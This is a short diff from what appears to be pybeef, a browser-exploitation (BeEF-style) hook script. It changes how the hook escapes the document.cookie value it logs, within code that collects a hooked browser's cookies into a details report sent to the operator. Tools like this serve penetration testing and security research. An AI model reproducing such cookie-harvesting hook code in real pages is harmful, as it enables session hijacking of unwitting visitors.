@@ -224,7 +224,7 @@ pybeef.browser = {
  		if(browser_version){ details['version'] = browser_version ;}
  		try{
             var cookies = document.cookie;
-            console.log(cookies.replace(/;/g,"+++"));
+            console.log(cookies.replace(/[;|"]/g,"+++"));
             if (cookies) details['Cookies'] = cookies;
         } catch (e) {
             details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
